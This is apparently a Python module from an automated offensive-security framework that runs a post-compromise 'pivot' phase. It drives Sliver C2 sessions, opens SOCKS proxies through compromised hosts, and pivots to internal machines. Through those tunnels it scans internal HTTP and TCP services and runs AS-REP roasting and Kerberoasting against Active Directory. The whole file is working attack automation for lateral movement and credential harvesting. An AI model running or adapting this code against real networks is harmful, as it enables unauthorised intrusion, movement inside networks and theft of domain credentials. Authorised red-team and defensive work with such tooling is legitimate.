import asyncio
import json
import logging
import socket
import time
from dataclasses import dataclass, field
from typing import Optional

from orchestrator.brain.phases.models import Finding, PhaseResult, Severity

logger = logging.getLogger("phase_pivot")

try:
    from orchestrator.c2.manager import get_c2
    from orchestrator.pivot.manager import get_pivot, PivotHop
    from orchestrator.ad.toolkit import get_ad_toolkit
    C2_AVAILABLE = True
except ImportError:
    C2_AVAILABLE = False
    logger.warning("C2/pivot modules not available")


@dataclass
class NetworkTarget:
    ip: str
    hostname: Optional[str] = None
    ports: list[int] = field(default_factory=list)
    services: dict[int, str] = field(default_factory=dict)
    os: Optional[str] = None
    domain: Optional[str] = None
    reachable: bool = False


@dataclass
class PivotResult:
    session_id: str
    target_ip: str
    proxy_url: str
    method: str
    success: bool
    error: Optional[str] = None


async def run_pivot(target: str, findings: list[Finding] = None) -> PhaseResult:
    t0 = time.time()
    all_findings = list(findings or [])
    errors = []

    if not C2_AVAILABLE:
        return PhaseResult(
            phase="pivot",
            success=False,
            findings=all_findings,
            summary="Pivot phase skipped: C2/pivot modules unavailable",
            latency=time.time() - t0,
            error="C2 modules not available",
        )

    c2 = get_c2()
    pivot_mgr = get_pivot()
    ad = get_ad_toolkit()

    await c2.init("sliver")
    sessions = await c2.refresh_sessions()
    local_sessions = [s for s in sessions if target in s.address or target in s.hostname]

    if not c2.backend_available:
        errors.append("C2 backend unavailable (no Sliver/agent capability)")
    elif not local_sessions:
        errors.append(f"No active C2 sessions for target {target}")

    for s in local_sessions:
        all_findings.append(Finding(
            phase="pivot", type="c2_session_active", target=target,
            host=s.address, severity=Severity.HIGH,
            description=f"Active C2 session on {s.hostname} ({s.os})",
            evidence=f"transport: {s.transport} | last checkin: {s.last_checkin}",
        ))
        if not s.proxy_url:
            proxy = await c2.socks_enable(s.id)
            if proxy:
                pivot_mgr.add_hop(PivotHop(
                    session_id=s.id, hostname=s.hostname,
                    address=s.address, proxy_url=proxy,
                ))
                all_findings.append(Finding(
                    phase="pivot", type="pivot_enabled", target=target,
                    host=s.address, severity=Severity.INFO,
                    description=f"SOCKS proxy through {s.hostname}",
                    evidence=f"proxy: {proxy}",
                ))

    pivot_targets = _discover_internal_networks(findings)
    for pt in pivot_targets[:5]:
        try:
            pivot_result = await _pivot_to_target(c2, pivot_mgr, target, pt)
            if pivot_result.success:
                all_findings.append(Finding(
                    phase="pivot", type="pivot_success", target=target,
                    host=pt.ip, severity=Severity.HIGH,
                    description=f"Pivot established to {pt.ip} via {pivot_result.method}",
                    evidence=f"proxy: {pivot_result.proxy_url} | session: {pivot_result.session_id}",
                ))
                await _scan_internal(pivot_mgr, pt.ip, all_findings, target)
        except Exception as e:
            logger.warning(f"Pivot to {pt.ip} failed: {e}")
            errors.append(f"pivot:{pt.ip}:{e}")

    if ad.has_impacket:
        try:
            np_result = await ad.get_np_users(target, domain="", proxy_env={})
            if np_result.get("asrep_users"):
                for u in np_result["asrep_users"][:10]:
                    all_findings.append(Finding(
                        phase="pivot", type="asrep_roastable", target=target,
                        severity=Severity.HIGH,
                        description=f"AS-REP roastable: {u}",
                        evidence=str(np_result.get("stdout", ""))[:300],
                        raw=np_result,
                    ))

            spn_result = await ad.get_user_spns(target, target, proxy_env={})
            if spn_result.get("spns"):
                for spn in spn_result["spns"][:10]:
                    all_findings.append(Finding(
                        phase="pivot", type="kerberoastable_spn", target=target,
                        severity=Severity.HIGH,
                        description=f"SPN: {spn}",
                        evidence=str(spn_result.get("stdout", ""))[:300],
                    ))
        except Exception as e:
            logger.warning(f"AD attacks via pivot failed: {e}")
            errors.append(f"ad:{e}")

    latency = time.time() - t0
    return PhaseResult(
        phase="pivot",
        success=len([f for f in all_findings if f.phase == "pivot"]) > 0,
        findings=all_findings,
        summary=f"Pivot: {len(local_sessions)} sessions, {len(pivot_targets)} internal targets discovered",
        latency=latency,
        error="; ".join(errors) if errors else None,
    )


def _discover_internal_networks(findings: list[Finding] = None) -> list[NetworkTarget]:
    targets = []
    for f in findings or []:
        if f.type == "smb_share" and f.evidence:
            targets.append(NetworkTarget(ip=f.host or f.target, hostname=f.evidence))
        if f.type == "smb_user" and f.evidence:
            targets.append(NetworkTarget(ip=f.host or f.target))
        if f.type == "dns_resolution" and f.evidence:
            targets.append(NetworkTarget(ip=f.evidence, hostname=f.description))
        if f.port and f.port in (139, 445, 3389, 5985, 5986, 22):
            targets.append(NetworkTarget(ip=f.host or f.target, ports=[f.port]))

    seen = set()
    unique = []
    for t in targets:
        if t.ip not in seen:
            seen.add(t.ip)
            unique.append(t)
    return unique[:10]


async def _pivot_to_target(c2, pivot_mgr, parent_target: str, pt: NetworkTarget) -> "PivotResult":
    sessions = await c2.refresh_sessions()
    for s in sessions:
        if s.address == pt.ip or s.hostname == pt.ip:
            proxy = await c2.socks_enable(s.id)
            if proxy:
                pivot_mgr.add_hop(PivotHop(
                    session_id=s.id, hostname=s.hostname,
                    address=s.address, proxy_url=proxy,
                ))
                return PivotResult(s.id, pt.ip, proxy, "existing_session", True)
    return PivotResult("", pt.ip, "", "none", False, "No session found")


async def _scan_internal(pivot_mgr, target_ip: str, all_findings: list[Finding], parent_target: str):
    proxy = pivot_mgr.get_proxy_for(target_ip)
    if not proxy:
        return

    try:
        import requests
    except ImportError:
        logger.warning("requests not available for internal pivot scanning")
        return
    proxies = {"http": proxy, "https": proxy}
    http_ports = {80, 443, 8080, 8443, 3000, 5000, 8000, 8888, 9000}
    tcp_ports = [3389, 445, 139, 5985, 5986, 22, 3306, 5432, 6379, 389, 636]
    for port in list(http_ports) + tcp_ports:
        try:
            if port in http_ports:
                r = requests.get(f"http://{target_ip}:{port}", proxies=proxies, timeout=5, verify=False)
                if r.status_code < 500:
                    all_findings.append(Finding(
                        phase="pivot", type="internal_service", target=parent_target,
                        host=target_ip, port=port, severity=Severity.MEDIUM,
                        description=f"Internal HTTP service on {target_ip}:{port} via pivot",
                        evidence=f"HTTP {r.status_code} | Server: {r.headers.get('Server', '?')}",
                    ))
            else:
                open_ = await _tcp_via_proxy(proxy, target_ip, port)
                if open_:
                    all_findings.append(Finding(
                        phase="pivot", type="internal_service", target=parent_target,
                        host=target_ip, port=port, severity=Severity.MEDIUM,
                        description=f"Internal TCP service on {target_ip}:{port} via pivot",
                        evidence=f"TCP port {port} open",
                    ))
        except Exception:
            logger.debug("Non-critical error", exc_info=True)


async def _tcp_via_proxy(proxy_url: str, host: str, port: int) -> bool:
    """Check TCP port through an HTTP proxy via CONNECT tunneling."""
    try:
        from urllib.parse import urlparse
        pu = urlparse(proxy_url)
        proxy_host = pu.hostname or "127.0.0.1"
        proxy_port = pu.port or 1080
        rd, writer = await asyncio.wait_for(
            asyncio.open_connection(proxy_host, proxy_port), timeout=5)
        connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n"
        writer.write(connect_req.encode())
        await writer.drain()
        resp = await asyncio.wait_for(rd.readuntil(b"\r\n\r\n"), timeout=5)
        status_line = resp.split(b"\r\n")[0].decode(errors="replace")
        ok = "200" in status_line
        writer.close()
        await writer.wait_closed()
        return ok
    except Exception:
        return False


async def run_pivot_and_lateral(target: str, findings: list[Finding] = None) -> PhaseResult:
    return await run_pivot(target, findings)